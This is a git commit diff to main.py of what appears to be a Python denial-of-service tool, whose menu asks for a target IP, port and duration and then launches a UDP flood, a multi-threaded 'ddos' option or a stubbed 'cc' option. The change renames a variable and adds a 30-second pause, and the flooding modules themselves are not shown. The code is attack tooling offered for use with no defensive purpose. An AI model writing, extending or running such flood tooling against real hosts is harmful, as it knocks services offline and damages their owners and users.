39a5281438d75bfaf2056734fa0856ec14aed3ec
lvpitun <1105263198@qq.com>
2020-01-25 21:33:48 +0800

    新增方法“

--- main.py
+++ main.py
@@ -1,3 +1,5 @@
+from time import sleep
+
 import udpflood
 import tool
 import push
@@ -9,11 +11,11 @@ if choose == "1":
     print("Now you in udpflood method")
     ip = input("Please input the ip you wanna attack：")  # todo 校验ip
     port = input("Please input the port you wanna attack：")
-    usertime = input("Please input the time you wanna attack：")
+    user_time = input("Please input the time you wanna attack：")
     ip_right = tool.check_ip(ip)
     tool.ping(ip_right)
     tool.test_port(ip_right, port)
-    udpflood.udpfloods(ip_right, port, usertime)  # todo string转
+    udpflood.udpfloods(ip_right, port, user_time)  # todo string转
 elif choose == "2":
     # todo ddos
     ip = input("Please input the ip you wanna attack：")
@@ -21,6 +23,7 @@ elif choose == "2":
     ip_right = tool.check_ip(ip)
     tool.ping(ip_right)
     tool.test_port(ip_right, port)
+    sleep(30)
     push.more_thread(ip_right, port)
 elif choose == "3":
     # todo cc
